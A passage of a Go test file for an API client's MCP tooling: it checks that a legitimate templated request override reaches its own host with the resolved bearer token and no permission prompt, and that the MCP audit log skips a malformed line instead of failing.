		t.Fatalf("a legitimate templated override was refused: %v", err)
	}
	if result.Status != http.StatusOK {
		t.Fatalf("status = %d, want 200", result.Status)
	}
	if len(f.prompts()) != 0 {
		t.Errorf("a run to the request's own known host prompted %d times", len(f.prompts()))
	}
	recorded := f.recorded()
	if len(recorded) != 1 {
		t.Fatalf("recorded %d requests, want 1: %+v", len(recorded), recorded)
	}
	if recorded[0].path != "/v2/users" {
		t.Errorf("the override resolved to %q, want /v2/users", recorded[0].path)
	}
	// The secret still resolved inside LiteAPI and reached the server: the
	// refusal above did not cost the tier its actual purpose.
	if recorded[0].authHeader != "Bearer "+runSentinelToken {
		t.Errorf("the request reached the server with Authorization %q", recorded[0].authHeader)
	}
}

// --- 5. the audit store, attacked further -------------------------------------

// A malformed line spliced into the audit log (a crash mid-write, disk
// corruption) must be skipped by List, not turn the whole log unreadable or
// error out. Distinct from mcp_run_test.go's coverage, which never exercises
// a genuinely malformed line.
func TestMCPAuditStoreSkipsAMalformedLineWithoutBreakingList(t *testing.T) {
	app := newAppForTest(t)
	store := app.mcpAudit()

	if err := store.Append(types.MCPAuditEntry{At: time.Now().UTC(), Tool: "list_collections", Outcome: "ok"}); err != nil {
		t.Fatalf("append the first good entry: %v", err)
	}

	path := filepath.Join(app.dataDir, "mcp-audit.jsonl")
	file, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		t.Fatalf("open the audit log to splice a malformed line: %v", err)
	}
	if _, err := file.WriteString("{not valid json, truncated mid-write\n"); err != nil {
		t.Fatalf("splice a malformed line: %v", err)
	}
	if err := file.Close(); err != nil {
		t.Fatalf("close after splicing: %v", err)
	}

	if err := store.Append(types.MCPAuditEntry{At: time.Now().UTC(), Tool: "run_request", Outcome: "denied"}); err != nil {
		t.Fatalf("append the second good entry: %v", err)
	}

	entries, err := store.List(0)
	if err != nil {
		t.Fatalf("List after a malformed line: %v", err)
	}
	if len(entries) != 2 {
		t.Fatalf("got %d entries, want 2 (the malformed line must be skipped, not fatal): %+v", len(entries), entries)
	}
	if entries[0].Tool != "run_request" || entries[1].Tool != "list_collections" {
		t.Errorf("entries = %+v, want run_request then list_collections (newest first)", entries)
	}
}
